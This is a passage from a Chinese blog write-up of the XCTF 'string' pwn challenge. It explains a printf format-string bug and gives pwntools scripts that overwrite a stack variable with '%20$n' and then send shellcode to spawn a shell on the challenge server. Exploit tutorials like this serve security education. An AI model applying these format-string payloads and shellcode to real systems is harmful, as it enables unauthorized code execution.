&#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>为了更加清楚的表示出各个函数之间的关系，我将上面的函数包含关系做了一个示意图，如下：</p>
+</blockquote>
+<p><img src="/images/120-1.png" alt></p>
+<blockquote>
+<p>从上面的图中可以得出这样的结论：</p>
+<ul>
+<li><p>要想使程序执行shellcode就需要使<code>*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)</code>条件成立</p>
+</li>
+<li><p>该程序一共有 <code>5</code> 处输入，要想程序成功执行shellcode，其中前三个输入被要求为：</p>
+<ul>
+<li><code>What should your character&#39;s name be:</code> 要求长度不超过13的字符串</li>
+<li><code>So, where you will go?east or up?:</code> 要求输入<code>east</code></li>
+<li><code>go into there(1), or leave(0)?:</code> 要求输入<code>1</code>‘</li>
+</ul>
+<p>其中后面两个输入都可以被利用，后面会一一进行讲解</p>
+<ul>
+<li>在第<code>5</code>个输入后有一个printf的格式化字符串漏洞</li>
+</ul>
+</li>
+</ul>
+<p>目前上述信息是通过IDA逆向后能到的信息，下面我们简单的运行一下该程序</p>
+</blockquote>
+<p><code>知识点1：mmap();函数</code><sup>[1]</sup></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当创建一个或者切换一个进程的同时，会把属于这个当前进程的系统信息载入。这些系统信息中包含了当前进程的运行空间。当用户程序调用mmap后。函数会在当前进程的空间中找到适合的vma来描述自己将要映射的区域。这个区域的作用就是将mmap函数中文件描述符所指向的具体文件中内容映射过来。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理是mmap的执行，仅仅是在内核中建立了文件与虚拟内存空间的对应关系。用户访问这些虚拟内存空间时，页面表里面是没有这些空间的表项的。当用户程序试图访问这些映射的空间时，于是产生缺页异常。内核捕捉这些异常，逐渐将文件载入。所谓的载入过程，具体的操作就是read和write在管理pagecache。Vma的结构体中有很文件操作集。vma操作集中会有自己关于page cache的操作集合。这样，虽然是两种不同的系统调用，由于操作和调用触发的路径不同。但是最后还是落实到了page cache的管理。实现了文件内容的操作。</p>
+<h4 id="4-运行-pwn"><a href="#4-运行-pwn" class="headerlink" title="4.运行 pwn"></a><code>4.运行 pwn</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Dragon Games!</span><br><span class="line">                                                 .~)&gt;&gt;</span><br><span class="line">                                               .~))))&gt;&gt;&gt;</span><br><span class="line">                                             .~))&gt;&gt;             ___\</span><br><span class="line">                                           .~))&gt;&gt;)))&gt;&gt;      .-~))&gt;&gt;\</span><br><span class="line">                                         .~)))))&gt;&gt;       .-~))&gt;&gt;)&gt;   </span><br><span class="line">                                       .~)))&gt;&gt;))))&gt;&gt;  .-~)&gt;&gt;)&gt;       </span><br><span class="line">                   )                 .~))&gt;&gt;))))&gt;&gt;  .-~)))))&gt;&gt;)&gt;</span><br><span class="line">                ( )@@*)             //)&gt;))))))  .-~))))&gt;&gt;)&gt;</span><br><span class="line">              ).@(@@               //))&gt;&gt;))) .-~))&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">            (( @.@).              //))))) .-~)&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">          ))  )@@*.@@ )          //)&gt;))) //))))))&gt;&gt;))))&gt;&gt;)&gt;</span><br><span class="line">       ((  ((@@@.@@             |/))))) //)))))&gt;&gt;)))&gt;&gt;)&gt;</span><br><span class="line">      )) @@*. )@@ )   (\_(\  |))&gt;)) //)))&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">    (( @@@(.@(@ .    _/`-`  ~|b |&gt;))) //)&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">     )* @@@ )@*     (@) (@)  |))) //))))))&gt;&gt;))))&gt;&gt;</span><br><span class="line">   (( @. )@( @ .   _/       / )) //))&gt;&gt;)))))&gt;&gt;&gt;_._</span><br><span class="line">    )@@ (@@*)@@.  (6,   6) / ^ )//))))))&gt;&gt;)))&gt;&gt;   ~~-.</span><br><span class="line"> ( @jgs@@. @@@.*@_ ~^~^~, /\  ^ /)&gt;&gt;))))&gt;&gt;      _.     `,</span><br><span class="line">  ((@@ @@@*.(@@ .   \^^^/&apos; (  ^  )))&gt;&gt;        .&apos;         `,</span><br><span class="line">   ((@@).*@@ )@ )    `-&apos;   ((   ^  ~)_          /             `,</span><br><span class="line">     (@@. (@@ ).           (((   ^    `\        |               `.</span><br><span class="line">       (*.@*              / ((((        \        \      .         `.</span><br><span class="line">                         /   (((((  \    \    _.-~\     Y,         ;</span><br><span class="line">                        /   / (((((( \    \.-~   _.`&quot; _.-~`,       ;</span><br><span class="line">                       /   /   `(((((()    )    (((((~      `,     ;</span><br><span class="line">                     _/  _/      `&quot;&quot;&quot;/   /&apos;                  ;     ;</span><br><span class="line">                 _.-~_.-~           /  /&apos;                _.-~   _.&apos;</span><br><span class="line">               ((((~~              / /&apos;              _.-~ __.--~</span><br><span class="line">                                  ((((          __.-~ _.-~</span><br><span class="line">                                              .&apos;   .~~</span><br><span class="line">                                              :    ,&apos;</span><br><span class="line"></span><br><span class="line">we are wizard, we will give you hand, you can not defeat dragon by yourself ...</span><br><span class="line">we will tell you two secret ...</span><br><span class="line">secret[0] is 15812a0</span><br><span class="line">secret[1] is 15812a4</span><br><span class="line">do not tell anyone </span><br><span class="line">What should your character&apos;s name be:							// 第1处输入</span><br><span class="line">&gt; hello,world!</span><br><span class="line"></span><br><span class="line">Creating a new player.</span><br><span class="line"> This is a famous but quite unusual inn. The air is fresh and the</span><br><span class="line">marble-tiled ground is clean. Few rowdy guests can be seen, and the</span><br><span class="line">furniture looks undamaged by brawls, which are very common in other pubs</span><br><span class="line">all around the world. The decoration looks extremely valuable and would fit</span><br><span class="line">into a palace, but in this city it&apos;s quite ordinary. In the middle of the</span><br><span class="line">room are velvet covered chairs and benches, which surround large oaken</span><br><span class="line">tables. A large sign is fixed to the northern wall behind a wooden bar. In</span><br><span class="line">one corner you notice a fireplace.</span><br><span class="line">There are two obvious exits: east, up.</span><br><span class="line">But strange thing is ,no one there.</span><br><span class="line">So, where you will go?east or up?:								// 第2处输入</span><br><span class="line">&gt; east				</span><br><span class="line"></span><br><span class="line">You travel a short distance east.That&apos;s odd, anyone disappear suddenly</span><br><span class="line">, what happend?! You just travel , and find another hole</span><br><span class="line">You recall, a big black hole will suckk you into it! Know what should you do?</span><br><span class="line">go into there(1), or leave(0)?:									// 第3处输入</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">A voice heard in your mind</span><br><span class="line">&apos;Give me an address&apos;											// 第4处输入</span><br><span class="line">&gt; 1111</span><br><span class="line"></span><br><span class="line">And, you wish is:												// 第5处输入</span><br><span class="line">&gt; nihao</span><br><span class="line"></span><br><span class="line">Your wish is</span><br><span class="line">nihaoI hear it, I hear it....</span><br><span class="line">Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!</span><br><span class="line">Dragon say: HaHa! you were supposed to have a normal</span><br><span class="line">RPG game, but I have changed it! you have no weapon and </span><br><span class="line">skill! you could not defeat me !</span><br><span class="line">That&apos;s sound terrible! you meet final boss!but you level is ONE!</span><br><span class="line">The End.....Really?</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>通过正常的输入，发现程序能正常运行，但是并不能满足<code>*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)</code>，因为v4的值从一开始就被赋值为<code>68</code>，v4[1]的值被赋值为<code>85</code>，所以等式是肯定不成立的。</p>
+</blockquote>
+<h4 id="5-理清思路"><a href="#5-理清思路" class="headerlink" title="5.理清思路"></a><code>5.理清思路</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过上述分析之后，现在再理清一下该题目的思路：</p>
+<ol>
+<li>我们要想成功执行shellcode，就必须使得v4[0]=v4[1]，那么我们怎么样才能把v4的值改为85，或者把v4[1]的值改为68？</li>
+<li>修改变量值的两种方法：<ul>
+<li>通过栈溢出，从而达到修改局部变量值的目的，但是本题开启了Canary，所以不容易实现</li>
+<li>因为在本题中发现了格式化字符串漏洞，所以可以根据格式化字符串漏洞进行修改，那怎么通过格式化字符串漏洞的手段来修改v4或者v4[1]的值呢？</li>
+</ul>
+</li>
+<li>在<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>中存在一道例题，就是把变量a的值修改为8，从而执行if分支。我们可以根据那个原理来做本题，这里我们只对v4进行修改，如果相对v4[1]修改的话，可以自己尝试一下。</li>
+</ol>
+<h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><code>0x02 解题步骤</code></h3><h4 id="1-查找-format-地址的参数偏移"><a href="#1-查找-format-地址的参数偏移" class="headerlink" title="1.查找 format 地址的参数偏移"></a><code>1.查找 format 地址的参数偏移</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这里我们忽略前4个的输入和输出结果，直接来到第5个输入处，首先一定要知道该<code>pwn</code>是一个<code>64</code>位的ELF文件，我们在第5个输入处输入<code>AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx</code>，查看结果如下：</p>
+<p><img src="/iamges/120-2.jpg" alt></p>
+<blockquote>
+<p>通过上图可以发现<code>AAAAAAAA</code>的十六进制<code>4141414141414141</code>使printf函数的第 9 个参数，使格式化字符串的第 8 个参数，我们来验证一下我们的猜想对不对，下面给出在gdb中的调试结果，如下图：</p>
+</blockquote>
+<p><img src="/images/120-3.jpg" alt></p>
+<p><code>知识点2：64位下的传参约定</code><sup>[2]</sup></p>
+<blockquote>
+<ul>
+<li>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9；</li>
+<li>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</li>
+</ul>
+</blockquote>
+<p><code>知识点3：格式化字符串的控制符</code><sup>[3]</sup></p>
+<blockquote>
+<ul>
+<li>%x: 他可以将对应参数的值以16进制打印出来，<strong>%x只能打印4个字节，%lx或者%llx可以打8个字节</strong>。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。</li>
+<li>%s：可以打印<strong>对应参数所指向的字符串</strong>。</li>
+<li>%n: 可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。<strong>还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。</strong>像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，</li>
+</ul>
+</blockquote>
+<h4 id="2-将-v4-的地址存放在-format-首地址处"><a href="#2-将-v4-的地址存放在-format-首地址处" class="headerlink" title="2.将 v4 的地址存放在 format 首地址处"></a><code>2.将 v4 的地址存放在 format 首地址处</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;和<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>一样，我们将 v4 的地址存放在 format 首地址处，因为前面已经有了8bytes，那么还需要 <code>85-8=77</code> 个字符，然后再通过%8$n（因为format的首地址是格式化字符串的第8个参数），又因为前面程序已经将v4的地址打印了出来，所以正常来说payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = str(p64(v4_addr),encoding=&quot;unicode_escape&quot;) + &quot;a&quot;*77 + &quot;%8$n&quot;</span><br></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果正常执行的话，栈中和寄存器的情况如下：</p>
+<p><img src="/120-4.png" alt></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么最终的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"><span class="comment">#r = remote("124.126.19.106",38510)</span></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v3_addr))</span><br><span class="line"> </span><br><span class="line">payload = str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">77</span> + <span class="string">"%8$n"</span></span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行该exp文件，并没有得到我们想要的结果（打印出”Wizard: I will help you! USE YOU SPELL”），下图是程序停止的地方：</p>
+<p><img src="/120-5.jpg" alt></p>
+<blockquote>
+<p>为什么会在这个地方停止运行了呢？这里涉及到一个知识点程序遇到”\x00“会发生截断<sup>[3]</sup>，但是将<code>\x00</code>其放在字符串的末尾就可以解决了<sup>[4]</sup>，那么下一步就是要看一下，在那里发生了截断，从上图中可以看出，应该是因为v4地址在小段输入时产生了\x00，我们在运行exp.py程序前，提前想到将v4的地址以小段的形式打印了出来，那么我们去看一下：<code>[+] p64(v3_addr) is  ÒÔ\x00\x00</code>果然含有截断符号，那么下一步我们要把v4的地址放到最后，这样就不会发生截断，因此构造出了</p>
+<p><code>[&quot;a&quot;*85][%length$n][padding][v4_addr]</code></p>
+<ul>
+<li><p>中间部分为<code>%length$n</code>和<code>padding</code></p>
+</li>
+<li><p>前部分应该是长度为85的字符串，我们可以用”a“*85进行填充</p>
+</li>
+<li><p>由于v4的地址需要单独放在一个64位的地址空间，所以这里需要对齐：</p>
+<ul>
+<li>”a“*85：这是85个字符长度</li>
+<li>%length$n：由于length不确定，所以该长度不确定</li>
+<li>p64(v4_addr)：长度为8 bytes，但是需要地址对齐</li>
+</ul>
+<p>我们现在来计算length的值，因为”a“*85的长度除以8等于10.625，又因为前8个”a“是格式化字符串的第8个参数，所以length的数值肯定大于10，如果大于10的话，那么85个”a“和<code>%length$n</code>的长度为90，因为90不能整除8，所以还需要6个字符作为<code>padding</code>，这样算下来(85+5+6)/8=96/8=12，再加上前面7个参数等于19，所以说v4_addr相当于格式化字符串的第20个参数。</p>
+</li>
+</ul>
+</blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过上述分析，我们又重新得到一个新的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"><span class="comment">#r = remote("124.126.19.106",38510)</span></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v4_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload = str(p64(v4_addr),encoding="unicode_escape") + "a"*77 + "%8$n"</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">85</span> + <span class="string">"%20$n"</span> + <span class="string">"a"</span>*<span class="number">6</span> + str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) </span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/images/120-4.png" alt></p>
+<blockquote>
+<p>得到的结果如上图，从得到的输出来看，我们已经成功的修改了v4的值，下面我们就写入shellcode，得到flag，完整的exp如下：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">38510</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v3_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">85</span> + <span class="string">"%20$n"</span> + <span class="string">"a"</span>*<span class="number">6</span> + str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) </span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "a"*85 + "%7$n</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>,shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-其他方法"><a href="#0x03-其他方法" class="headerlink" title="0x03 其他方法"></a><font color="navy"><code>0x03 其他方法</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网上关于这道题目的做法有很多，大部分都是通过第4个输入<code>&#39;Give me an address&#39;</code>来改变v4的值，在这里我就不再多多赘述，这里有几个这样做法的writeup，但是里面有很多问题，希望大家能够批判性的去学习。当然在这里因为我个人水平有限的，我也不敢保证这篇writeup也不存在问题，如果存在问题，还希望大家在评论区指正说明。</p>
+<ul>
+<li><a href="https://blog.csdn.net/qq_43681242/article/details/103681367?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">攻防世界pwn新手练习（string）</a></li>
+<li><a href="https://blog.csdn.net/fastergohome/article/details/103627264" target="_blank" rel="noopener">string [XCTF-PWN]CTF writeup系列7（超详细分析）</a></li>
+</ul>
+<h3 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a><code>0x04 Reference</code></h3><p>[1] <a href="https://www.cnblogs.com/shijingxiang/articles/5185068.html" target="_blank" rel="noopener">Mmap的实现原理和应用</a></p>
+<p>[2] <a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener">64位汇编参数传递</a></p>
+<p>[3] <a href="http://dittozzz.top/2019/02/22/格式化串漏洞利用总结/" target="_blank" rel="noopener">格式化串漏洞利用总结</a>⭐</p>
+<p>[4] <a href="https://wizardforcel.gitbooks.io/q-buffer-overflow-tutorial/content/86.html" target="_blank" rel="noopener">5.1.2 ShellCode编码的用处</a></p>
+<p>[5] <a href="https://www.cnblogs.com/junjiany/p/7055064.html" target="_blank" rel="noopener">python第一行注释是什么意思？</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://muzibing.github.io">MUZIBing</a>
+            </p><p>原文链接：<a href="https://muzibing.github.io/2020/05/30/2020.05.30（120）/">https://muzibing.github.io/2020/05/30/2020.05.30（120）/</a>
+            </p><p>发表日期：<a href="https://muzibing.github.io/2020/05/30/2020.05.30（120）/">May 30th 2020, 12:00:00 am</a>
+            </p><p>更新日期：<a href="https://muzibing.github.io/2020/05/30/2020.05.30（120）/">May 30th 2020, 11:54:14 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/05/29/2020.05.29（119）/" title="详解格式化字符串漏洞">
+                    <div class="prevTitle">详解格式化字符串漏洞</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80Mjk3OS8xOTUyNQ==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1527305742@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//muzibing.github.io" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
